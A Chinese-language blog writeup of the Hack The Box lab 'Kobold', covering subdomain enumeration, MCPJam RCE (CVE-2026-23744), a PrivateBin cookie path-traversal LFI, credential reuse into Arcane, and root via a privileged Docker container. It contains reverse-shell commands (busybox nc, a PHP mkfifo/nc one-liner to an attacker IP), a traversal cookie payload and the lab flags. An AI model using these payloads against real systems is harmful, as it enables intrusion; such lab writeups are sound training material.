---
title: HTB Kobold 靶场 Writeup
date: 2026-08-30 21:00:00
categories:
  - 靶场
tags:
  - HTB
  - Kobold
  - 靶场
description: HTB Kobold 靶场 Writeup
---

## Nmap

```
nmap -sV 10.129.127.169 -A
```

![image-20260323201040200](/img/htb/htb-kobold-001.png)

- 3个开放端口：SSH （22）、HTTP（80，重定向为HTTPS）、HTTPS （443）
- Ubuntu 上的 nginx 1.24.0
- 通配符TLS证书——表示带有子域名的虚拟主机路由`*.kobold.htb`
- 80号端口重定向至`https://kobold.htb/`

(将机器主机名添加到本地主机文件中：

```
echo "10.129.127.169 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

10.129.245.50   (一开始因为是https,所以证书不受信任，在 Firefox 里点 Advanced 后继续访问)

![image-20260323202259535](/img/htb/htb-kobold-002.png)

## 子域枚举

```
ffuf -c -k -u 'https://10.129.127.169/' \
-H 'Host: FUZZ.target.htb' \
-w ~/SecLists/Discovery/DNS/combined_subdomains.txt \
-ac
```

发现了两个子领域：mcp.kobold.htb—— MCP Jam

![image-20260323204244991](/img/htb/htb-kobold-003.png)

再全面扫一下端口：

```
nmap -Pn -p- --min-rate 3000 -T4 kobold.htb
```

![image-20260323213600731](/img/htb/htb-kobold-004.png)

发现还有一个3552端口

但是直接访问 https://kobold.htb:3552/ 访问不了,但是http:// 可以

进入了一个登录页面

![image-20260323214241817](/img/htb/htb-kobold-005.png)

Arcane 1.13.0

但是没有用户名和密码，登录不了

## CVE-2026-23744

还是得再从mcp.kobold.htb —— mcpJam入手：

cve:CVE-2026-23744

MCPJam inspector 是一个用于 MCP 服务器的本地优先开发平台。 版本 1.4.2 及更早版本存在**远程代码执行（RCE）漏洞**，攻击者可通过构造 HTTP 请求触发 MCP 服务器安装流程，从而实现远程代码执行。 MCPJam inspector 默认监听 0.0.0.0，而非仅限本地的 127.0.0.1

poc:https://github.com/H1sok444/CVE-2026-23744-PoC#cve-2026-23744-poc

脚本参考：[HTB - Kobold-CSDN博客](https://blog.csdn.net/weixin_44368093/article/details/159390803)

> poc中使用 `busybox nc -e /bin/sh` 作为回连方式，但这种写法强依赖目标环境中存在 BusyBox 版本的 netcat，且要求其支持 `-e` 参数。靶场中，这个命令是可以弹shell，但不完整

运行exp脚本：

![image-20260324173928425](/img/htb/htb-kobold-006.png)

监听：

![image-20260324180448129](/img/htb/htb-kobold-007.png)

拿到shell，进入ben用户

![image-20260324180531142](/img/htb/htb-kobold-008.png)

拿到flag 1：faa4cc3bf937add58bfde63015625d15

## 提权

拿到shell之后发现是一个docker

进入shell之后，先扫一下端口：

> LinPEAS它能自动搜索系统中可能存在的权限提升漏洞，包括错误配置的文件权限、敏感信息泄露、SUID/SGID错误设置等，并通过醒目的颜色标记来突出显示潜在的安全风险。

kali下载：

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

shell转载：

```
wget http://10.10.14.55:8000/linpeas.sh && chmod 755 linpeas.sh && ./linpeas.sh
```

![image-20260324185615821](/img/htb/htb-kobold-009.png)

发现docker 挂在8080端口，找到一个子域名bin.kobold.htb

![image-20260323204142794](/img/htb/htb-kobold-010.png)

查找PrivateBin 2.0.2漏洞，发现1.7.7至2.0.3版本前存在本地文件包含漏洞（可能导致代码执行），以及CVE-2024-39899的URL缩短绕过漏洞

- **本地文件包含 (LFI) 漏洞 (影响 1.7.7 - <2.0.3)**：源于模板切换功能，攻击者可能利用此漏洞读取敏感文件或实现远程代码执行 (RCE)。
- **URL 缩短服务滥用 (CVE-2024-39899)**：通过代理机制，攻击者可以缩短任意 URL，绕过限制，该漏洞在 1.7.4 版本已修复。
- **跨站脚本漏洞 (CVE-2020-5223)**：早期版本中存在，通常已在后来的版本中修复。

## Privatebin - 本地 LFI漏洞

> （补充一句：信息搜集的方法，在github上搜这个服务，找他的Security模块，下面有对应版本范围的漏洞）

https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82

漏洞点：当站点启用了 **`templateselection`** 配置后，服务端会**信任客户端提供的 `template` cookie**，并把它当成模板名去拼接本地文件路径，随后执行 `include`，**如果攻击者把 `template` cookie 改成带 `../` 的相对路径，就能从 `tpl/` 目录向上跳，去包含别的本地 PHP 文件。** GHSA 明确指出这里允许 **directory traversal**，但只会拼出 **`.php`** 文件；**绝对路径不行**，要用**相对于 `tpl` 目录的路径**

写码：

```
cd /privatebin-data/data
echo '<?php phpinfo();?>' > pwn.php
```

然后构造如下请求包

```
GET / HTTP/1.1
Host: bin.kobold.htb
......
Cookie: template=../data/pwn 
```

![image-20260324193015404](/img/htb/htb-kobold-011.png)

验证成功，写入shell(https://www.ddosi.org/shell/#bind)

![image-20260324194123621](/img/htb/htb-kobold-012.png)

```
echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.55 1111 >/tmp/f");?>' > pwn4.php
```

然后bp发包，kali监听

![image-20260324194200254](/img/htb/htb-kobold-013.png)

拿到shell，但是没拿到root.txt

![image-20260324193537435](/img/htb/htb-kobold-014.png)

## 信息搜集

> （这里整理一下：一开始通过mcpjam的漏洞版本找到cve，rce拿到第一个用户的shell，进入shell之后发现是在docker，扫发现bin子域名，发现PrivateBin漏洞，利用本地 LFI任意文件读取漏洞，在tmp目录下写码写shell,弹shell,拿到第二个用户，目前还有3552端口的Arcane没有利用，而Arcane需要登录，所以现在就要找用户名和密码）

找到一个配置文件 /srv/cfg/conf.php

发现数据库名和密码：像是PrivateBin 对应 MySQL 数据库的账号密码

![image-20260324202612678](/img/htb/htb-kobold-015.png)

用arcane  ComplexP@sswordAdmin1928 登录

![image-20260324203146384](/img/htb/htb-kobold-016.png)

这是 **Arcane** 的 Docker 管理后台 / 仪表盘（Dashboard）

Arcane 1.13.0

![image-20260324205709970](/img/htb/htb-kobold-017.png)

在bin这个容器里进行命令执行，发现/root被禁（当前没root权限）

新创建一个容器

利用Docker 的默认行为：**如果镜像里没有显式指定 `USER`，容器默认就以 root 运行**

![image-20260324204624818](/img/htb/htb-kobold-018.png)

路径配置

![image-20260324210433594](/img/htb/htb-kobold-019.png)

安全性设置为特权模式

![image-20260324210239121](/img/htb/htb-kobold-020.png)

![image-20260324205209747](/img/htb/htb-kobold-021.png)

进入这个docker，在shell里命令执行，此时的docker 拥有root权限

![image-20260324204915547](/img/htb/htb-kobold-022.png)

拿到flag 2：8c6652b331e18fe098e5bfd7759528cf

![image-20260324205042299](/img/htb/htb-kobold-023.png)

![image-20260324205141088](/img/htb/htb-kobold-024.png)
